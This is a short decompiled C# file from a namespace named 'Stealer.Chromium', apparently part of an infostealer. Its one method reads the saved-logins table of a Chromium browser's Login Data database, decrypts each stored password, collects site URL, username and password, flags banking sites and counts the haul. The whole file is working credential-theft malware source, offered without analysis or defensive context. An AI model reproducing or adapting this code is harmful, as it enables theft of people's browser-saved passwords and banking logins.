using System;
using System.Collections.Generic;

namespace Stealer.Chromium
{
	// Token: 0x0200003A RID: 58
	internal sealed class Passwords
	{
		// Token: 0x060000F2 RID: 242 RVA: 0x000085CC File Offset: 0x000067CC
		public static List<Password> Get(string sLoginData)
		{
			List<Password> result;
			try
			{
				List<Password> list = new List<Password>();
				SQLite sqlite = SqlReader.ReadTable(sLoginData, "logins");
				if (sqlite == null)
				{
					result = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						Password item = default(Password);
						item.sUrl = Crypto.GetUTF8(sqlite.GetValue(i, 0));
						item.sUsername = Crypto.GetUTF8(sqlite.GetValue(i, 3));
						string value = sqlite.GetValue(i, 5);
						if (value != null)
						{
							item.sPassword = Crypto.GetUTF8(Crypto.EasyDecrypt(sLoginData, value));
							list.Add(item);
							Banking.ScanData(item.sUrl);
							Counter.Passwords++;
						}
					}
					result = list;
				}
			}
			catch
			{
				result = new List<Password>();
			}
			return result;
		}
	}
}
